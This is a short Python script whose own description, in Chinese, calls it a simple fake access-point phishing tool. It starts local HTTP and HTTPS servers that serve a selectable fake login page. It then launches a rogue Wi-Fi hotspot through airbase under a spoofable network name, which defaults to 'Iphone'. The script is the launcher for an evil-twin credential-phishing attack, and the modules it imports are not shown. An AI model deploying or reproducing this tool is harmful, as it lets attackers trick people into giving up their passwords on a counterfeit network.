# -*- coding:utf-8 -*-
import argparse
import threading
import time
from Modules import ReadyWork
from Modules import HttpServer
from Modules import SecureHttpServer
from Modules import StartAP_airbase




def main():
    parser = argparse.ArgumentParser(description="一款简单的伪造AP钓鱼工具")
    parser.add_argument("--route_page",default='original',help="指定登录验证页面类型")
    parser.add_argument("--wifiname",default="Iphone",help="指定伪造WIFI名称")
    args = parser.parse_args()
    
    routepage_dict={'original':"Modules/access-point-pages/minimal", \
                'mianliao':'Modules/access-point-pages/mianliao'}
    
    route_page=routepage_dict[args.route_page]

    ReadyWork.Start(IP="127.0.0.1",PORT=8080,SSL_IP="127.0.0.1",SSL_PORT=443)

    ts=[]
    ts.append(threading.Thread(target=HttpServer.Start, args=('127.0.0.1',8080,route_page,)))
    ts.append(threading.Thread(target=SecureHttpServer.Start, args=("127.0.0.1",443,'127.0.0.1',8080,)))
    for t in ts:
        t.setDaemon(True)
        t.start()

    time.sleep(3) #等待上面线程完成准备工作，否则会出现显示混乱
    AP=StartAP_airbase.StartAP(a_iface='eth0',ap_iface="wlan0",wifiname=args.wifiname,channel=1)
    AP.run()
    
                        
main()
